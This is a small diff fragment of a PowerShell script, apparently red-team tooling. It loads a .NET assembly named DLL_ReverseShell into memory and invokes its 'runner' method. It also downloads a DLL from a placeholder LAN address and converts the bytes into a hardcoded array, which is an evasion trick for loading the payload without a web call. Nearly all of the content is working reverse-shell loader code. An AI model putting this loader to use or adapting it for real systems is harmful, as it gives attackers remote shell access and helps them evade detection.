@@ -12,7 +12,6 @@ $class = $assem.GetType("DLL_ReverseShell.ReverseShell")
 $method = $class.GetMethod("runner")
 $method.Invoke(0,$null)
 
-
 # Assembly is loaded into memory without a web call by hardcoding the bytes in a variable
 $data = (New-Object System.Net.WebCLient).DownloadData('http://192.168.x.x/runner.dll')
 ($data | % {'0x' + $([System.Convert]::ToString($_,16))}) -join ','
